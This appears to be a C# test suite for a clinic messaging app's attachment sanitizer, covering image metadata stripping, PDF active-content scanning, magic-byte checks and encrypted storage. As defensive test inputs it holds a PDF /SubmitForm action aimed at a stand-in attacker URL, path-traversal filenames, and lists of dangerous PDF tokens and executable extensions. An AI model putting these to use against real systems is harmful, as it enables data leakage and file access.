using System;
using System.Buffers.Binary;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ClinicEz.Comms.Application.Features.Attachments.Commands;
using ClinicEz.Comms.Domain.Enums;
using ClinicEz.Comms.Infrastructure.Security;
using ClinicEz.Comms.Infrastructure.Storage;
using ClinicEz.Comms.Tests.Support;
using Microsoft.Extensions.Configuration;
using Xunit;

namespace ClinicEz.Comms.Tests;

public class AttachmentAdversarialTests
{
    // =========================================================================
    // SECTION 1: JPEG EXIF STRIPPING ADVERSARIAL VECTORS
    // =========================================================================

    [Fact]
    public async Task JpegExifStripper_StripsMultipleApp1App13AndCommentMarkers_PreservesStructuralSegments()
    {
        using var ms = new MemoryStream();
        // 1. SOI: 0xFF 0xD8
        ms.Write([0xFF, 0xD8]);

        // 2. APP0 (JFIF standard header - must be preserved): 0xFF 0xE0, length = 16
        ms.Write([0xFF, 0xE0, 0x00, 0x10]);
        ms.Write(Encoding.ASCII.GetBytes("JFIF\0\x01\x01\x00\x00\x01\x00\x01\x00\x00"));

        // 3. APP1 (EXIF metadata with GPS coordinates - MUST BE STRIPPED): 0xFF 0xE1, length = 24
        ms.Write([0xFF, 0xE1, 0x00, 0x18]);
        ms.Write(Encoding.ASCII.GetBytes("Exif\0\0GPS:14.5995N,120.9842E"));

        // 4. APP1 (XMP packet - MUST BE STRIPPED): 0xFF 0xE1, length = 22
        ms.Write([0xFF, 0xE1, 0x00, 0x16]);
        ms.Write(Encoding.ASCII.GetBytes("http://ns.adobe.com/"));

        // 5. APP2 (ICC color profile - should be preserved): 0xFF 0xE2, length = 14
        ms.Write([0xFF, 0xE2, 0x00, 0x0E]);
        ms.Write(Encoding.ASCII.GetBytes("ICC_PROFILE\0"));

        // 6. APP13 (Photoshop / IPTC metadata - MUST BE STRIPPED): 0xFF 0xED, length = 16
        ms.Write([0xFF, 0xED, 0x00, 0x10]);
        ms.Write(Encoding.ASCII.GetBytes("Photoshop 3.0\0"));

        // 7. COM (User comment - MUST BE STRIPPED): 0xFF 0xFE, length = 20
        ms.Write([0xFF, 0xFE, 0x00, 0x14]);
        ms.Write(Encoding.ASCII.GetBytes("Device:iPhone15Pro"));

        // 8. DQT (Quantization table - must be preserved): 0xFF 0xDB, length = 6
        ms.Write([0xFF, 0xDB, 0x00, 0x06, 0x00, 0x01, 0x02, 0x03]);

        // 9. DHT (Huffman table - must be preserved): 0xFF 0xC4, length = 6
        ms.Write([0xFF, 0xC4, 0x00, 0x06, 0x00, 0x00, 0x01, 0x05]);

        // 10. SOF0 (Start of frame - must be preserved): 0xFF 0xC0, length = 9 (2 bytes len + 7 bytes)
        ms.Write([0xFF, 0xC0, 0x00, 0x09, 0x08, 0x00, 0x64, 0x00, 0x64, 0x03, 0x01]);

        // 11. SOS (Start of scan - must be preserved): 0xFF 0xDA, length = 8
        ms.Write([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00]);

        // 12. Entropy data + RST0 (0xFF 0xD0) + Entropy data
        ms.Write([0xAA, 0xBB, 0xCC, 0xFF, 0x00, 0xDD, 0xEE]);

        // 13. EOI (End of image - must be preserved): 0xFF 0xD9
        ms.Write([0xFF, 0xD9]);

        ms.Position = 0;

        var (stripped, sanitizedBytes) = await JpegExifStripper.StripExifAsync(ms);

        Assert.True(stripped, "JpegExifStripper should report stripped=true when metadata markers are removed.");
        Assert.NotNull(sanitizedBytes);

        // Verify SOI
        Assert.Equal(0xFF, sanitizedBytes[0]);
        Assert.Equal(0xD8, sanitizedBytes[1]);

        var latin1Text = Encoding.Latin1.GetString(sanitizedBytes);

        // Assert all stripped markers are absent
        Assert.DoesNotContain("\xFF\xE1", latin1Text); // APP1 (EXIF / XMP)
        Assert.DoesNotContain("\xFF\xED", latin1Text); // APP13 (IPTC)
        Assert.DoesNotContain("\xFF\xFE", latin1Text); // COM (Comments)
        Assert.DoesNotContain("GPS:14.5995N", latin1Text);
        Assert.DoesNotContain("Device:iPhone15Pro", latin1Text);
        Assert.DoesNotContain("Photoshop 3.0", latin1Text);

        // Assert structural markers are preserved
        Assert.Contains("\xFF\xE0", latin1Text); // APP0 (JFIF)
        Assert.Contains("\xFF\xE2", latin1Text); // APP2 (ICC)
        Assert.Contains("\xFF\xDB", latin1Text); // DQT
        Assert.Contains("\xFF\xC4", latin1Text); // DHT
        Assert.Contains("\xFF\xC0", latin1Text); // SOF0
        Assert.Contains("\xFF\xDA", latin1Text); // SOS
        Assert.EndsWith("\xFF\xD9", latin1Text); // EOI
    }

    [Fact]
    public async Task JpegExifStripper_CleanJpegWithoutMetadata_ReturnsUnchanged()
    {
        using var ms = new MemoryStream();
        ms.Write([0xFF, 0xD8]); // SOI
        ms.Write([0xFF, 0xE0, 0x00, 0x06, 0x4A, 0x46, 0x49, 0x46]); // APP0 JFIF
        ms.Write([0xFF, 0xDB, 0x00, 0x06, 0x01, 0x02, 0x03, 0x04]); // DQT
        ms.Write([0xFF, 0xDA, 0x00, 0x04, 0x01, 0x00]);             // SOS
        ms.Write([0x55, 0x66, 0x77, 0x88]);                         // Scan data
        ms.Write([0xFF, 0xD9]);                                     // EOI
        ms.Position = 0;

        var originalBytes = ms.ToArray();
        ms.Position = 0;

        var (stripped, sanitizedBytes) = await JpegExifStripper.StripExifAsync(ms);

        Assert.False(stripped, "Clean JPEG without EXIF should return stripped=false.");
        Assert.Equal(originalBytes, sanitizedBytes);
    }

    // =========================================================================
    // SECTION 2: PNG METADATA STRIPPING ADVERSARIAL VECTORS
    // =========================================================================

    [Fact]
    public async Task PngExifStripper_StripsExifTextZtxtItxtDsig_PreservesIhdrPlteIdatIend()
    {
        using var ms = new MemoryStream();
        // PNG 8-byte signature
        ms.Write([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);

        // 1. IHDR (Critical chunk - 13 bytes data)
        WriteChunk(ms, "IHDR", new byte[13]);

        // 2. PLTE (Palette - 6 bytes data)
        WriteChunk(ms, "PLTE", [0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00]);

        // 3. eXIf (Metadata chunk - GPS EXIF bytes)
        WriteChunk(ms, "eXIf", Encoding.ASCII.GetBytes("EXIF GPS Data: 12.34, 56.78"));

        // 4. tEXt (Plain text metadata)
        WriteChunk(ms, "tEXt", Encoding.ASCII.GetBytes("Author=Nurse Joy\0Hospital=St. Jude"));

        // 5. zTXt (Compressed text metadata)
        WriteChunk(ms, "zTXt", [0x43, 0x6F, 0x70, 0x79, 0x00, 0x00, 0x78, 0x9C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01]);

        // 6. iTXt (International text metadata)
        WriteChunk(ms, "iTXt", Encoding.UTF8.GetBytes("Comment\0\0\0\0\0Sensitive patient clinical note"));

        // 7. dSIG (Digital signature metadata)
        WriteChunk(ms, "dSIG", [0x01, 0x02, 0x03, 0x04, 0x05, 0x06]);

        // 8. pHYs (Physical pixel dimensions - ancillary chunk that should be preserved)
        WriteChunk(ms, "pHYs", [0x00, 0x00, 0x0B, 0x13, 0x00, 0x00, 0x0B, 0x13, 0x01]);

        // 9. IDAT 1 (Image data chunk 1)
        WriteChunk(ms, "IDAT", [0x11, 0x22, 0x33, 0x44]);

        // 10. IDAT 2 (Image data chunk 2)
        WriteChunk(ms, "IDAT", [0x55, 0x66, 0x77, 0x88]);

        // 11. IEND (Image end marker)
        WriteChunk(ms, "IEND", []);

        ms.Position = 0;

        var (stripped, sanitizedBytes) = await PngExifStripper.StripMetadataAsync(ms);

        Assert.True(stripped, "PngExifStripper should report stripped=true when metadata chunks are removed.");
        var text = Encoding.ASCII.GetString(sanitizedBytes);

        // Assert all metadata chunks are completely stripped
        Assert.DoesNotContain("eXIf", text);
        Assert.DoesNotContain("tEXt", text);
        Assert.DoesNotContain("zTXt", text);
        Assert.DoesNotContain("iTXt", text);
        Assert.DoesNotContain("dSIG", text);
        Assert.DoesNotContain("Nurse Joy", text);
        Assert.DoesNotContain("Sensitive patient clinical note", text);

        // Assert critical & ancillary non-metadata chunks are preserved
        Assert.Contains("IHDR", text);
        Assert.Contains("PLTE", text);
        Assert.Contains("pHYs", text);
        Assert.Contains("IDAT", text);
        Assert.Contains("IEND", text);

        // Verify PNG signature intact
        Assert.Equal(0x89, sanitizedBytes[0]);
        Assert.Equal(0x50, sanitizedBytes[1]);
        Assert.Equal(0x4E, sanitizedBytes[2]);
        Assert.Equal(0x47, sanitizedBytes[3]);
    }

    [Fact]
    public async Task PngExifStripper_CleanPngWithoutMetadata_ReturnsUnchanged()
    {
        using var ms = new MemoryStream();
        ms.Write([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
        WriteChunk(ms, "IHDR", new byte[13]);
        WriteChunk(ms, "IDAT", [0x10, 0x20]);
        WriteChunk(ms, "IEND", []);
        var originalBytes = ms.ToArray();
        ms.Position = 0;

        var (stripped, sanitizedBytes) = await PngExifStripper.StripMetadataAsync(ms);

        Assert.False(stripped);
        Assert.Equal(originalBytes, sanitizedBytes);
    }

    // =========================================================================
    // SECTION 3: ACTIVE PDF SCRIPTING ADVERSARIAL VECTORS
    // =========================================================================

    [Theory]
    [InlineData("/JavaScript")]
    [InlineData("/JS")]
    [InlineData("/Launch")]
    [InlineData("/EmbeddedFiles")]
    [InlineData("/Filespec")]
    [InlineData("/EF")]
    [InlineData("/RichMedia")]
    [InlineData("/XFA")]
    [InlineData("/SubmitForm")]
    [InlineData("/ImportData")]
    [InlineData("/GoToR")]
    [InlineData("/GoToE")]
    public async Task PdfSecurityScanner_AllDangerousUncompressedTokens_AreQuarantined(string token)
    {
        var rawPdf = $"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S {token} >> >>\nendobj\n%%EOF";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(rawPdf));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean, $"Expected token {token} to be quarantined.");
        Assert.NotNull(quarantineReason);
        Assert.Contains(token, quarantineReason, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("/javascript")]
    [InlineData("/js")]
    [InlineData("/launch")]
    [InlineData("/embeddedfiles")]
    [InlineData("/submitform")]
    public async Task PdfSecurityScanner_CaseInsensitiveTokenVariants_AreQuarantined(string lowercaseToken)
    {
        var rawPdf = $"%PDF-1.7\n1 0 obj\n<< /Action << /S {lowercaseToken} >> >>\nendobj\n%%EOF";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(rawPdf));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean);
        Assert.NotNull(quarantineReason);
        Assert.Contains(lowercaseToken, quarantineReason, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("/JavaScript")]
    [InlineData("/JS")]
    [InlineData("/Launch")]
    [InlineData("/EmbeddedFiles")]
    [InlineData("/SubmitForm")]
    public async Task PdfSecurityScanner_DangerousTokens_HiddenInFlateDecodeStreams_AreQuarantined(string hiddenToken)
    {
        byte[] compressedPayload;
        using (var compressMs = new MemoryStream())
        {
            using (var zlib = new ZLibStream(compressMs, CompressionLevel.Optimal, leaveOpen: true))
            {
                var payload = Encoding.ASCII.GetBytes($"<< /Type /Action /S {hiddenToken} /Payload (malicious_action) >>");
                zlib.Write(payload);
            }
            compressedPayload = compressMs.ToArray();
        }

        using var ms = new MemoryStream();
        var header = Encoding.ASCII.GetBytes("%PDF-1.7\n1 0 obj\n<< /Filter /FlateDecode /Length " + compressedPayload.Length + " >>\nstream\r\n");
        ms.Write(header);
        ms.Write(compressedPayload);
        var trailer = Encoding.ASCII.GetBytes("\r\nendstream\nendobj\n%%EOF");
        ms.Write(trailer);

        ms.Position = 0;

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean, $"Expected hidden compressed token {hiddenToken} to be quarantined.");
        Assert.NotNull(quarantineReason);
        Assert.Contains(hiddenToken, quarantineReason, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("compressed stream", quarantineReason, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task PdfSecurityScanner_CleanLegitimatePdf_PassesVerdict()
    {
        var legitimatePdf = "%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n198\n%%EOF";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(legitimatePdf));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.True(isClean);
        Assert.Null(quarantineReason);
    }

    [Fact]
    public async Task PdfSecurityScanner_MissingPdfHeader_IsRejected()
    {
        var corrupted = "NOT_A_PDF_STREAM\n1 0 obj\nendobj\n%%EOF";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(corrupted));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean);
        Assert.Contains("Missing %PDF- header", quarantineReason);
    }

    [Fact]
    public async Task PdfSecurityScanner_MissingEofTrailer_IsRejected()
    {
        var corrupted = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(corrupted));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean);
        Assert.Contains("Missing %%EOF marker", quarantineReason);
    }

    // =========================================================================
    // SECTION 4: POLYGLOT, SPOOFING & EXTENSION ADVERSARIAL VECTORS
    // =========================================================================

    [Fact]
    public void MagicByteValidator_ExecutableBinaryDisguisedAsJpg_IsRejected()
    {
        // Windows PE executable header: MZ (0x4D, 0x5A)
        byte[] mzExecutableBytes = [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00];

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            mzExecutableBytes,
            "patient_scan.jpg",
            "image/jpeg");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("Magic bytes mismatch", errorMessage);
    }

    [Fact]
    public void MagicByteValidator_ExecutableBinaryDisguisedAsPdf_IsRejected()
    {
        byte[] mzExecutableBytes = [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00];

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            mzExecutableBytes,
            "medical_clearance.pdf",
            "application/pdf");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("Magic bytes mismatch", errorMessage);
    }

    [Fact]
    public void MagicByteValidator_PlainTextDisguisedAsPdf_IsRejected()
    {
        var plainText = Encoding.ASCII.GetBytes("This is plain text pretending to be a PDF report.");

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            plainText,
            "lab_result.pdf",
            "application/pdf");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("Magic bytes mismatch", errorMessage);
    }

    [Fact]
    public void MagicByteValidator_JpegBytesWithPdfExtension_IsRejected()
    {
        byte[] jpegBytes = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10];

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            jpegBytes,
            "spoofed.pdf",
            "application/pdf");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("Magic bytes mismatch", errorMessage);
    }

    [Fact]
    public void MagicByteValidator_PngBytesWithJpgExtension_IsRejected()
    {
        byte[] pngBytes = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            pngBytes,
            "spoofed.jpg",
            "image/jpeg");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("Magic bytes mismatch", errorMessage);
    }

    [Theory]
    [InlineData("payload.exe")]
    [InlineData("exploit.pdf.exe")]
    [InlineData("report.bat")]
    [InlineData("virus.vbs")]
    [InlineData("script.ps1")]
    [InlineData("backdoor.cmd")]
    [InlineData("calc.msi")]
    [InlineData("macro.jar")]
    [InlineData("shell.sh")]
    [InlineData("screensaver.scr")]
    [InlineData("app.hta")]
    public void MagicByteValidator_DangerousFileExtensions_AreRejectedImmediately(string dangerousFilename)
    {
        byte[] dummyBytes = [0xFF, 0xD8, 0xFF, 0xE0];

        var (isValid, normalizedMime, errorMessage) = MagicByteValidator.ValidateHeader(
            dummyBytes,
            dangerousFilename,
            "application/octet-stream");

        Assert.False(isValid);
        Assert.Null(normalizedMime);
        Assert.Contains("dangerous", errorMessage, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("../../etc/passwd.pdf", "passwd.pdf")]
    [InlineData("..\\..\\windows\\system32\\calc.png", "calc.png")]
    [InlineData("folder/nested/sub/rx_order.jpg", "rx_order.jpg")]
    [InlineData("file;with|bad*chars?.pdf", "file_with_bad_chars_.pdf")]
    public void MagicByteValidator_SanitizeFileName_StripsDirectoryTraversalAndSpecialChars(
        string rawInput,
        string expectedSanitized)
    {
        var sanitized = MagicByteValidator.SanitizeFileName(rawInput);
        Assert.Equal(expectedSanitized, sanitized);
    }

    // =========================================================================
    // SECTION 5: FULL ATTACHMENT PIPELINE & AES-256-GCM INTEGRATION
    // =========================================================================

    [Fact]
    public async Task AttachmentPipeline_ExecutesEndToEndSanitization_AndSha256Checksum()
    {
        var pipeline = new AttachmentPipeline();

        // Synthetic JPEG with EXIF APP1
        using var ms = new MemoryStream();
        ms.Write([0xFF, 0xD8]);
        ms.Write([0xFF, 0xE1, 0x00, 0x0C]);
        ms.Write(Encoding.ASCII.GetBytes("Exif\0\01234"));
        ms.Write([0xFF, 0xDA, 0x00, 0x04, 0x01, 0x00]);
        ms.Write([0xDE, 0xAD, 0xBE, 0xEF]);
        ms.Write([0xFF, 0xD9]);
        ms.Position = 0;

        var result = await pipeline.ProcessAsync(
            ms,
            "path/to/my_photo.jpg",
            "image/jpeg");

        Assert.True(result.IsClean);
        Assert.True(result.StrippedExif);
        Assert.Equal("my_photo.jpg", result.SafeFileName);
        Assert.Equal("image/jpeg", result.ContentType);
        Assert.NotEmpty(result.Sha256Hash);

        // Verify SHA256 checksum matches sanitized bytes
        var expectedHash = Convert.ToHexString(SHA256.HashData(result.SanitizedBytes)).ToLowerInvariant();
        Assert.Equal(expectedHash, result.Sha256Hash);

        // Verify EXIF was actually removed from sanitized bytes
        var sanitizedText = Encoding.Latin1.GetString(result.SanitizedBytes);
        Assert.DoesNotContain("\xFF\xE1", sanitizedText);
        Assert.DoesNotContain("Exif", sanitizedText);
    }

    [Fact]
    public async Task UploadAttachmentCommandHandler_StoresEncryptedBlob_AndVerifiesRoundTripDecryption()
    {
        var db = TestDbContextFactory.CreateInMemory();
        var pipeline = new AttachmentPipeline();
        var tempStorageDir = Path.Combine(Path.GetTempPath(), "clinicez_test_storage_" + Guid.NewGuid().ToString("N"));
        var inMemoryConfig = new ConfigurationBuilder()
            .AddInMemoryCollection(new[] { new System.Collections.Generic.KeyValuePair<string, string?>("Storage:BasePath", tempStorageDir) })
            .Build();
        var storage = new LocalCommsStorageService(inMemoryConfig);

        var handler = new UploadAttachmentCommandHandler(db, pipeline, storage);

        try
        {
            // Build valid JPEG
            using var ms = new MemoryStream();
            ms.Write([0xFF, 0xD8]);
            ms.Write([0xFF, 0xDB, 0x00, 0x06, 0x01, 0x02, 0x03, 0x04]);
            ms.Write([0xFF, 0xDA, 0x00, 0x04, 0x01, 0x00]);
            ms.Write([0x01, 0x02, 0x03, 0x04]);
            ms.Write([0xFF, 0xD9]);
            ms.Position = 0;

            var command = new UploadAttachmentCommand(
                ms,
                "xray.jpeg",
                "image/jpeg",
                ms.Length,
                "tenant-alpha",
                "facility-bravo");

            var result = await handler.Handle(command, CancellationToken.None);

            Assert.Equal(AttachmentStatus.Clean, result.Status);
            Assert.NotEmpty(result.FileKey);

            var saved = await db.MessageAttachments.FindAsync(result.AttachmentId);
            Assert.NotNull(saved);
            Assert.Equal("tenant-alpha", saved.TenantId);
            Assert.Equal("facility-bravo", saved.FacilityId);

            // Read raw ciphertext from disk
            var rawCiphertext = await storage.ReadEncryptedAttachmentAsync(saved.StoragePath);
            Assert.NotNull(rawCiphertext);

            // Decrypt with AES-256-GCM using entity IV, Tag, and WrappedKey
            var iv = Convert.FromBase64String(saved.EncryptionIvBase64);
            var tag = Convert.FromBase64String(saved.EncryptionTagBase64);
            var dek = Convert.FromBase64String(saved.WrappedKeyJson);

            var decryptedBytes = new byte[rawCiphertext.Length];
            using (var aesGcm = new AesGcm(dek, 16))
            {
                aesGcm.Decrypt(iv, rawCiphertext, tag, decryptedBytes);
            }

            // Verify decrypted bytes match SOI and EOI
            Assert.Equal(0xFF, decryptedBytes[0]);
            Assert.Equal(0xD8, decryptedBytes[1]);
            Assert.Equal(0xFF, decryptedBytes[^2]);
            Assert.Equal(0xD9, decryptedBytes[^1]);
        }
        finally
        {
            if (Directory.Exists(tempStorageDir))
            {
                Directory.Delete(tempStorageDir, recursive: true);
            }
        }
    }

    // =========================================================================
    // SECTION 6: ADVANCED CORNER CASES & RESILIENCE
    // =========================================================================

    [Fact]
    public async Task JpegExifStripper_HandlesMultipleFillBytesAndConsecutiveApp1Markers()
    {
        using var ms = new MemoryStream();
        ms.Write([0xFF, 0xD8]); // SOI

        // Fill bytes 0xFF 0xFF 0xFF followed by APP1
        ms.Write([0xFF, 0xFF, 0xFF, 0xE1, 0x00, 0x0A]);
        ms.Write(Encoding.ASCII.GetBytes("Exif\0\012"));

        // Fill bytes 0xFF 0xFF followed by second APP1
        ms.Write([0xFF, 0xFF, 0xE1, 0x00, 0x0A]);
        ms.Write(Encoding.ASCII.GetBytes("Exif\0\034"));

        // DQT
        ms.Write([0xFF, 0xDB, 0x00, 0x06, 0x01, 0x02, 0x03, 0x04]);

        // SOS
        ms.Write([0xFF, 0xDA, 0x00, 0x04, 0x01, 0x00]);
        ms.Write([0x11, 0x22]);

        // EOI
        ms.Write([0xFF, 0xD9]);
        ms.Position = 0;

        var (stripped, sanitizedBytes) = await JpegExifStripper.StripExifAsync(ms);

        Assert.True(stripped);
        var text = Encoding.Latin1.GetString(sanitizedBytes);
        Assert.DoesNotContain("\xFF\xE1", text);
        Assert.DoesNotContain("Exif", text);
        Assert.Contains("\xFF\xDB", text);
        Assert.Contains("\xFF\xDA", text);
    }

    [Fact]
    public async Task PngExifStripper_HandlesConsecutiveAndZeroLengthMetadataChunks()
    {
        using var ms = new MemoryStream();
        ms.Write([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
        WriteChunk(ms, "IHDR", new byte[13]);

        // Zero-length eXIf chunk (4 bytes length = 0, 4 bytes type, 4 bytes CRC)
        WriteChunk(ms, "eXIf", []);

        // Back-to-back metadata chunks
        WriteChunk(ms, "tEXt", Encoding.ASCII.GetBytes("Key1\0Value1"));
        WriteChunk(ms, "tEXt", Encoding.ASCII.GetBytes("Key2\0Value2"));
        WriteChunk(ms, "iTXt", Encoding.UTF8.GetBytes("Key3\0\0\0\0\0Value3"));

        WriteChunk(ms, "IDAT", [0x01, 0x02]);
        WriteChunk(ms, "IEND", []);
        ms.Position = 0;

        var (stripped, sanitizedBytes) = await PngExifStripper.StripMetadataAsync(ms);

        Assert.True(stripped);
        var text = Encoding.ASCII.GetString(sanitizedBytes);
        Assert.DoesNotContain("eXIf", text);
        Assert.DoesNotContain("tEXt", text);
        Assert.DoesNotContain("iTXt", text);
        Assert.DoesNotContain("Value1", text);
        Assert.DoesNotContain("Value2", text);
        Assert.DoesNotContain("Value3", text);
        Assert.Contains("IHDR", text);
        Assert.Contains("IDAT", text);
        Assert.Contains("IEND", text);
    }

    [Fact]
    public async Task PdfSecurityScanner_MultiStreamPdf_DetectsMaliciousStreamAfterCleanStream()
    {
        // Stream 1: Clean text stream
        byte[] cleanStream;
        using (var compressMs = new MemoryStream())
        {
            using (var zlib = new ZLibStream(compressMs, CompressionLevel.Optimal, leaveOpen: true))
            {
                zlib.Write(Encoding.ASCII.GetBytes("BT /F1 12 Tf 72 712 Td (Routine Clinical Report) Tj ET"));
            }
            cleanStream = compressMs.ToArray();
        }

        // Stream 2: Malicious /SubmitForm
        byte[] evilStream;
        using (var compressMs = new MemoryStream())
        {
            using (var zlib = new ZLibStream(compressMs, CompressionLevel.Optimal, leaveOpen: true))
            {
                zlib.Write(Encoding.ASCII.GetBytes("<< /Type /Action /S /SubmitForm /F (https://evil.attacker.com/leak) >>"));
            }
            evilStream = compressMs.ToArray();
        }

        using var ms = new MemoryStream();
        ms.Write(Encoding.ASCII.GetBytes("%PDF-1.7\n1 0 obj\n<< /Filter /FlateDecode /Length " + cleanStream.Length + " >>\nstream\r\n"));
        ms.Write(cleanStream);
        ms.Write(Encoding.ASCII.GetBytes("\r\nendstream\nendobj\n2 0 obj\n<< /Filter /FlateDecode /Length " + evilStream.Length + " >>\nstream\r\n"));
        ms.Write(evilStream);
        ms.Write(Encoding.ASCII.GetBytes("\r\nendstream\nendobj\n%%EOF"));

        ms.Position = 0;

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.False(isClean);
        Assert.NotNull(quarantineReason);
        Assert.Contains("/SubmitForm", quarantineReason);
        Assert.Contains("compressed stream", quarantineReason);
    }

    [Fact]
    public async Task PdfSecurityScanner_HeaderWithin1024Bytes_AndEofInTail_RecognizedCorrectly()
    {
        // 300 bytes of leading padding before %PDF- (valid per PDF 1.4-2.0 spec)
        var padding = new string(' ', 300);
        var pdf = $"{padding}%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n\n";
        using var ms = new MemoryStream(Encoding.ASCII.GetBytes(pdf));

        var (isClean, quarantineReason) = await PdfSecurityScanner.ScanPdfAsync(ms);

        Assert.True(isClean);
        Assert.Null(quarantineReason);
    }

    [Fact]
    public void MagicByteValidator_DoubleExtensionSpoofing_IsBlocked()
    {
        // Attackers often name files "report.exe.jpg" or "invoice.bat.png" to deceive previewers
        Assert.True(MagicByteValidator.HasDangerousExtension("report.exe.jpg"));
        Assert.True(MagicByteValidator.HasDangerousExtension("invoice.bat.png"));
        Assert.True(MagicByteValidator.HasDangerousExtension("script.ps1.pdf"));
        Assert.True(MagicByteValidator.HasDangerousExtension("setup.msi.jpeg"));

        byte[] jpegBytes = [0xFF, 0xD8, 0xFF, 0xE0];
        var (isValid, _, errorMessage) = MagicByteValidator.ValidateHeader(jpegBytes, "report.exe.jpg", "image/jpeg");
        Assert.False(isValid);
        Assert.Contains("dangerous", errorMessage, StringComparison.OrdinalIgnoreCase);
    }

    private static void WriteChunk(Stream stream, string type, byte[] data)
    {
        var lenBytes = BitConverter.GetBytes((uint)data.Length);
        if (BitConverter.IsLittleEndian) Array.Reverse(lenBytes);
        stream.Write(lenBytes);

        var typeBytes = Encoding.ASCII.GetBytes(type);
        stream.Write(typeBytes);

        if (data.Length > 0)
        {
            stream.Write(data);
        }

        stream.Write([0x00, 0x00, 0x00, 0x00]); // 4-byte CRC dummy
    }
}
